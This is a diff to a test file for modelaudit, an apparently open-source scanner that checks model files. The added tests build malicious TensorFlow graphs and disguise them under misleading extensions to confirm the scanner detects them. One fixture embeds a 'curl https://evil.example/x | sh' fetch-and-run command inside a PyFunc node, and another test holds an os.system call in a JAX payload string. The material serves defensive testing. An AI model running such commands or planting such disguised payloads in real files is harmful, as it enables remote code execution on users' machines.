@@ -2,26 +2,80 @@
 
 import bz2
 import gzip
+import importlib
 import json
 import lzma
 import pickle
+import struct
 import sys
 import tarfile
 import tempfile
 import zipfile
+from collections.abc import Callable
 from pathlib import Path
+from typing import cast
 
 import pytest
 
+from modelaudit import core as core_module
 from modelaudit.core import _is_huggingface_cache_file, determine_exit_code, scan_file, scan_model_directory_or_file
+from modelaudit.utils.file import detection as file_detection
 from modelaudit.utils.file.detection import (
     FLAX_MSGPACK_STRUCTURE_READ_BYTES,
     JAX_JSON_CHECKPOINT_STRUCTURE_READ_BYTES,
     LLAMAFILE_ROUTE_SCAN_BYTES,
     LLAMAFILE_ROUTE_TAIL_SCAN_BYTES,
+    SAFETENSORS_ROUTING_HEADER_PARSE_BYTES,
 )
 from modelaudit.utils.file.filtering import _ZIP_MEMBER_SNIFF_LIMIT
+from modelaudit.utils.tensorflow_compat import has_tensorflow_protobuf_stubs as _has_tf_protos
 from tests.helpers import create_mock_mxnet_symbol
+
+
+def _require_tf_protos() -> None:
+    if not _has_tf_protos():
+        pytest.skip("TensorFlow protobuf stubs unavailable")
+
+
+def _build_malicious_tf_metagraph() -> bytes:
+    _require_tf_protos()
+    import modelaudit.protos  # noqa: F401
+
+    meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
+    metagraph = meta_graph_pb2.MetaGraphDef()
+    metagraph.meta_info_def.meta_graph_version = "modelaudit_directory_route_test"
+    node = metagraph.graph_def.node.add()
+    node.name = "pyfunc_node"
+    node.op = "PyFunc"
+    node.attr["func"].s = b"python -c 'import os; os.system(\"curl https://evil.example/x | sh\")'"
+    return cast(bytes, metagraph.SerializeToString())
+
+
+def _build_malicious_tf_savedmodel() -> bytes:
+    _require_tf_protos()
+    import modelaudit.protos  # noqa: F401
+
+    saved_model_pb2 = importlib.import_module("tensorflow.core.protobuf.saved_model_pb2")
+    saved_model = saved_model_pb2.SavedModel()
+    saved_model.saved_model_schema_version = 1
+    metagraph = saved_model.meta_graphs.add()
+    node = metagraph.graph_def.node.add()
+    node.name = "pyfunc_node"
+    node.op = "PyFunc"
+    return cast(bytes, saved_model.SerializeToString())
+
+
+def _write_sparse_oversized_safetensors_candidate(path: Path) -> None:
+    header_len = SAFETENSORS_ROUTING_HEADER_PARSE_BYTES + 1
+    with path.open("wb") as handle:
+        handle.write(struct.pack("<Q", header_len))
+        handle.write(b"{")
+        handle.truncate(8 + header_len + 1)
+
+
+def _printable_unknown_proto_prefix(min_bytes: int) -> bytes:
+    field = b"z " + (b"x" * 32)
+    return field * ((min_bytes // len(field)) + 1)
 
 
 def _corrupt_zip_member_crc(path: Path, member_name: str) -> None:
@@ -245,6 +299,34 @@ class TestDirectoryFileFiltering:
         assert results["files_scanned"] == 1
         assert any("payload.jpg" in (issue.location or "") for issue in results.issues)
 
+    def test_disguised_oversized_safetensors_with_skipped_extension_fails_closed(
+        self,
+        tmp_path: Path,
+        monkeypatch: pytest.MonkeyPatch,
+    ) -> None:
+        disguised_payload = tmp_path / "weights.jpg"
+        _write_sparse_oversized_safetensors_candidate(disguised_payload)
+        from modelaudit.scanners.safetensors_scanner import SafeTensorsScanner
+
+        monkeypatch.setattr(
+            SafeTensorsScanner,
+            "calculate_file_hashes",
+            lambda _self, _path: pytest.fail("oversized SafeTensors headers must fail before hashing"),
+        )
+        monkeypatch.setattr(
+            core_module,
+            "_calculate_file_hash",
+            lambda _path: pytest.fail("oversized SafeTensors directory entries must fail before dedup hashing"),
+        )
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert "safetensors" in results.scanner_names
+        assert results["success"] is False
+        assert determine_exit_code(results) == 2
+        assert any(check.name == "Header Size Limit" for check in results.checks)
+
     def test_disguised_malicious_jax_json_checkpoint_is_scanned_without_ajax_near_match(self, tmp_path: Path) -> None:
         """Directory scans should preserve JAX metadata content but not `ajax` lookalikes."""
         payload = "jax.experimental.host_callback.call(os.system, 'id')"
@@ -407,6 +489,81 @@ class TestDirectoryFileFiltering:
         assert "flax_msgpack" in results.scanner_names
         assert results.file_metadata[str(ambiguous_payload)]["scan_outcome"] == "inconclusive"
         assert determine_exit_code(results) == 2
+
+    @pytest.mark.parametrize("filename", ["payload.jpg", "payload.py", "payload.pyw"])
+    def test_disguised_malicious_tf_metagraph_with_skipped_extension_is_scanned(
+        self,
+        tmp_path: Path,
+        filename: str,
+    ) -> None:
+        disguised_payload = tmp_path / filename
+        disguised_payload.write_bytes(b"\xa2\x06\x80\x08" + (b"x" * 1024) + _build_malicious_tf_metagraph())
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert "tf_metagraph" in results.scanner_names
+        assert determine_exit_code(results) == 1
+        assert any(issue.message == "Dangerous TensorFlow operation: PyFunc" for issue in results.issues)
+
+    @pytest.mark.parametrize("filename", ["saved.jpg", "saved.py", "saved.pyw"])
+    def test_disguised_malicious_tf_savedmodel_with_skipped_extension_is_scanned(
+        self,
+        tmp_path: Path,
+        filename: str,
+    ) -> None:
+        disguised_payload = tmp_path / filename
+        disguised_payload.write_bytes(_build_malicious_tf_savedmodel())
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert "tf_savedmodel" in results.scanner_names
+        assert determine_exit_code(results) == 1
+        assert any("PyFunc operation detected" in issue.message for issue in results.issues)
+
+    @pytest.mark.parametrize(
+        ("filename", "payload", "expected_scanner"),
+        [
+            ("prefixed-graph.jpg", _build_malicious_tf_metagraph, "tf_metagraph"),
+            ("prefixed-saved.jpg", _build_malicious_tf_savedmodel, "tf_savedmodel"),
+        ],
+    )
+    def test_printable_prefixed_malicious_tf_payload_with_skipped_extension_is_scanned(
+        self,
+        tmp_path: Path,
+        monkeypatch: pytest.MonkeyPatch,
+        filename: str,
+        payload: Callable[[], bytes],
+        expected_scanner: str,
+    ) -> None:
+        monkeypatch.setattr(file_detection, "JAX_JSON_CHECKPOINT_ROUTING_READ_BYTES", 64)
+        disguised_payload = tmp_path / filename
+        disguised_payload.write_bytes(_printable_unknown_proto_prefix(65) + payload())
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert expected_scanner in results.scanner_names
+        assert determine_exit_code(results) == 1
+
+    def test_budget_prefixed_malicious_tf_payload_with_skipped_extension_fails_closed(
+        self,
+        tmp_path: Path,
+        monkeypatch: pytest.MonkeyPatch,
+    ) -> None:
+        monkeypatch.setattr(file_detection, "_TF_METAGRAPH_MAX_ROUTING_FIELDS", 2)
+        disguised_payload = tmp_path / "budget-prefixed.jpg"
+        disguised_payload.write_bytes(
+            b"{" + (b"\x18\x00" * 3) + b"|" + b"z\x09\x81\xa6params\x80" + _build_malicious_tf_metagraph()
+        )
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert "tf_metagraph" in results.scanner_names
+        assert determine_exit_code(results) == 1
+        assert any(issue.message == "Dangerous TensorFlow operation: PyFunc" for issue in results.issues)
 
     def test_disguised_cntk_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
         disguised_payload = tmp_path / "cntk.jpg"
